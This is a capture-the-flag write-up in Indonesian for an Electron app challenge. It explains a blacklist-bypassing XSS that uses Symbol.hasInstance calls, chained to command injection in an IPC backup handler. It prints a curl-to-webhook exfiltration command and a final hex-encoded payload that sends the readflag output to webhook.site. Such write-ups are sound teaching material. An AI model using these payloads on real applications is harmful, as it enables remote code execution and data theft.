# Not So Planned

1. XSS in the app  
    Pada aplikasi, cara developer memasukkan description tidaklah aman, sehingga terdapat kerentanan XSS di dalam aplikasi. Namun terdapat sanitasi yang cukup ketat (sepertinya) pada data ``description``
    sanitasi yang digunakan:
    ```js
    const unnecessaryChar = "abbr acronym address applet area article aside audio base bdi bdo big blink blockquote br button canvas caption center cite code col colgroup command content data datalist dd del details dfn dialog dir div dl dt element em embed fieldset figcaption figure font footer form frame frameset head header hgroup hr html iframe image input kbd keygen label legend li link listing location main map mark marquee menu menuitem meta meter multicol nav nextid nobr noembed noframes noscript object optgroup output param picture plaintext pre progress samp script section select shadow slot small source spacer span strike strong sub . summary sup svg table tbody td template textarea tfoot th thead time tr track tt ul var video replace eval ( ) `".split(" ")
    ```
    dan cukup beruntung bahwa ternyata <img> tidak diblacklist
    ```js
    const escapeRegExp = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    for (const c of unnecessaryChar) {
        const pattern = new RegExp(escapeRegExp(c), 'gi');
        description = description.replace(pattern, '');
    }
    ```

Namun kita tetap bisa melakukan pemanggilan fungsi javascript tanpa parantheses dengan format berikut:
```js
args instanceof { [Symbol['hasInstance']]: Object['functionName'] }
```

2. Web prefference settings
    - Node integration: ``False``
    - Context Isolation: ``true``
    artinya kita tidak bisa melakukan pemanggilan nodeJS secara langsung pada browser context meskipun terdapat XSS

3. RCE via Unsafe IPC Handler in main process
    Ada 3 IPC handler di main.ts:
    ```js
    planCached.then(planCache => {
        ipcMain.handle('set-cached-plans', (_, plan: PlanInterface) =>{
            planCache.setCachedPlan(plan);
            mainWindow.webContents.send('plan-updated');
        });
        ipcMain.handle('get-cached-plans', _ => {
            return planCache.getCachedPlans();
        });
        ipcMain.handle('backup-cached-plans', (_, name: string) => {
            return planCache.backupCachedPlan(name);
        });
    });
    ```

    implementasi backupCachedPlan terdapat kerentanan command injection yakni pada PlanCached.ts:
    ```js
    backupCachedPlan(name: string){
        let command = '';
        switch (process.platform){
            case 'win32':
                command=`powershell -Command "Compress-Archive -Path ${this.path} -DestinationPath ${name}.zip"`;
                exec(command);
                break;
            case 'darwin':
                command=`zip -r ${this.path} ${name}.zip`;
                exec(command);
                break;
            case 'linux':
                command=`zip ${name}.zip ${this.path}`;
                exec(command);
                break;
            default:
                break;
        }
    }
    ```
    Sehingga memungkikan kita untuk menyusupi payload didalamnya dengan pemanggilan window.api.backupCachedPlan, namun karena . diblacklist, kita bisa ganti dengan menggunakan [] (``window['api']['backupCachedPlan']``) dan pemanggilan argumen menggunakan teknik sebelumnya.

    kita bisa escape hanya dengan menggunakan:
    ```sh
    gedagedi; curl http://webhook/?c=$(./readflag)
    ```

    Sehingga payload akhir yang bisa digunakan untuk mendapatkan flag adalah:
    ```js
    <img src=x onerror="'\x62\x61\x64\x2e\x7a\x69\x70\x20\x61\x3b\x20\x63\x75\x72\x6c\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x2e\x73\x69\x74\x65\x2f\x32\x65\x35\x62\x30\x33\x62\x66\x2d\x37\x38\x62\x62\x2d\x34\x33\x35\x34\x2d\x39\x66\x66\x38\x2d\x36\x65\x66\x37\x61\x33\x30\x62\x30\x32\x37\x62\x3f\x63\x3d\x24\x28\x2f\x72\x65\x61\x64\x66\x6c\x61\x67\x29\x20\x23' instanceof { [Symbol['hasInstance']]: window['api']['backupCachedPlan'] }">
    ```

# Ref
- [Invoke JS function without Parantheses](https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses)
